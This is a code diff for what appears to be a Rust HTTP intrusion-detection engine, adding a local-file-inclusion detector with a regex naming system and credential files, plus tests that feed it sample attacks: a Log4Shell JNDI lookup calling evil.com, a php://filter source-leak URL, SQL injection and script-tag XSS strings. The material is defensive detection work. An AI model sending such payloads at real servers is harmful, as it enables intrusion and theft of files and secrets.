@@ -33,6 +33,7 @@ impl HeuristicEngine {
                 Box::new(SqlInjection),
                 Box::new(Xss),
                 Box::new(PathTraversal),
+                Box::new(Lfi),
                 Box::new(Log4Shell),
                 Box::new(CmdInjection),
                 Box::new(SensitivePath),
@@ -114,6 +115,10 @@ static XSS_RE: LazyLock<Regex> = LazyLock::new(|| {
 
 static PATH_TRAVERSAL_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)(?:\.\.[/\\]|\.\.%2f|\.\.%5c|%2e%2e[/\\]|%2e%2e%2f|%2e%2e%5c|\.\.;[/\\]|/etc/passwd|/proc/self)").unwrap()
+});
+
+static LFI_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|hosts|group|nginx)|/proc/self/(?:environ|fd/|status|cmdline)|/var/log/[a-z]|/boot/grub|/windows/system32|/win\.ini|c:\\\\windows|file://|php://filter|php://input|expect://|data://)").unwrap()
 });
 
 static LOG4SHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
@@ -202,6 +207,31 @@ impl Heuristic for PathTraversal {
                 weight: 40,
                 detail: Some(http.path.clone()),
             }];
+        }
+        vec![]
+    }
+}
+
+/// Local file inclusion — attempts to read system files via path manipulation.
+pub struct Lfi;
+impl Heuristic for Lfi {
+    fn name(&self) -> &'static str {
+        "lfi"
+    }
+    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+        let http = match evt.http() {
+            Some(h) => h,
+            None => return vec![],
+        };
+        let (path, query) = http_text(http);
+        for t in [path.as_str(), query.as_str()] {
+            if LFI_RE.is_match(t) {
+                return vec![Signal {
+                    kind: SignalKind::Lfi,
+                    weight: 50,
+                    detail: Some(format!("matched in: {t}")),
+                }];
+            }
         }
         vec![]
     }
@@ -388,6 +418,24 @@ mod tests {
     }
 
     #[test]
+    fn detects_lfi() {
+        let e = http_evt("/page?file=/etc/shadow", None);
+        let signals = Lfi.analyze(&e);
+        assert!(!signals.is_empty());
+        assert_eq!(signals[0].kind, SignalKind::Lfi);
+    }
+
+    #[test]
+    fn detects_lfi_php_filter() {
+        let e = http_evt(
+            "/?page=php://filter/convert.base64-encode/resource=index",
+            None,
+        );
+        let signals = Lfi.analyze(&e);
+        assert!(!signals.is_empty());
+    }
+
+    #[test]
     fn detects_log4shell() {
         let e = http_evt("/", Some("${jndi:ldap://evil.com/x}"));
         let signals = Log4Shell.analyze(&e);
@@ -432,5 +480,76 @@ mod tests {
             signals.len() >= 3,
             "expected at least 3 signals, got {signals:?}"
         );
+    }
+}
+
+#[cfg(test)]
+mod proptests {
+    use super::*;
+    use crate::event::{HttpData, ProtocolData, SourceKind};
+    use proptest::prelude::*;
+
+    fn http_evt(path: &str, ua: Option<&str>) -> Event {
+        Event::new(
+            SourceKind::Synthetic,
+            std::net::IpAddr::V4(std::net::Ipv4Addr::new(1, 2, 3, 4)),
+            ProtocolData::Http(HttpData {
+                path: path.to_string(),
+                user_agent: ua.map(String::from),
+                ..Default::default()
+            }),
+        )
+    }
+
+    proptest! {
+        #[test]
+        fn proptest_sqli_union_select(payload in "(?i)union\\s+select") {
+            let e = http_evt(&format!("/?id={payload}"), None);
+            let signals = SqlInjection.analyze(&e);
+            prop_assert!(!signals.is_empty());
+        }
+
+        #[test]
+        fn proptest_sqli_or_1_1(sep in r#"['"]"#) {
+            let payload = format!("{sep} OR 1=1--");
+            let e = http_evt(&format!("/?id={payload}"), None);
+            let signals = SqlInjection.analyze(&e);
+            prop_assert!(!signals.is_empty());
+        }
+
+        #[test]
+        fn proptest_xss_script_tag(inner in r#"[a-zA-Z0-9]{1,20}"#) {
+            let payload = format!("/?q=<script>alert({inner})</script>");
+            let e = http_evt(&payload, None);
+            let signals = Xss.analyze(&e);
+            prop_assert!(!signals.is_empty());
+        }
+
+        #[test]
+        fn proptest_path_traversal_encoded(count in 1usize..=5) {
+            let payload = "%2e%2e%2f".repeat(count);
+            let e = http_evt(&format!("/{payload}"), None);
+            let signals = PathTraversal.analyze(&e);
+            prop_assert!(!signals.is_empty());
+        }
+
+        #[test]
+        fn proptest_log4shell_jndi(host in r#"[a-z]{1,10}\.com"#) {
+            let payload = format!("${{jndi:ldap://{host}/x}}");
+            let e = http_evt("/", Some(&payload));
+            let signals = Log4Shell.analyze(&e);
+            prop_assert!(!signals.is_empty());
+        }
+
+        #[test]
+        fn proptest_clean_request_no_sqli(
+            path in r#"/api/[a-z]+/[0-9]+"#,
+            q in r#"[a-z]=[a-z0-9]{1,20}"#
+        ) {
+            let full = format!("{path}?{q}");
+            let e = http_evt(&full, Some("Mozilla/5.0"));
+            let signals = SqlInjection.analyze(&e);
+            prop_assert!(signals.is_empty(), "false positive on {full}");
+        }
     }
 }
